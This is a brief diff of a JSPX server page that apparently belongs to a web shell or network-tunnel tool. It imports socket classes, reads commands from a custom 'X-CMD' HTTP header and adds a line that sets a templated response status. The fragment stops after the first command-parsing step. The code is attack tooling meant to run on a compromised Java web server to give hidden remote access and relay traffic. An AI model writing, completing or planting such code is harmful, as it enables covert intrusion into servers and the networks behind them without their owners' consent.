@@ -1,5 +1,6 @@
 <jsp:root version="2.0" xmlns:jsp="http://java.sun.com/JSP/Page"><jsp:directive.page contentType="text/html"/><jsp:directive.page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.*, java.net.UnknownHostException, java.net.Socket"/>
 <jsp:scriptlet><![CDATA[
+    response.setStatus(HTTPCODE);
     String cmd = request.getHeader("X-CMD");
     if (cmd != null) {
         String mark = cmd.substring(0,22);
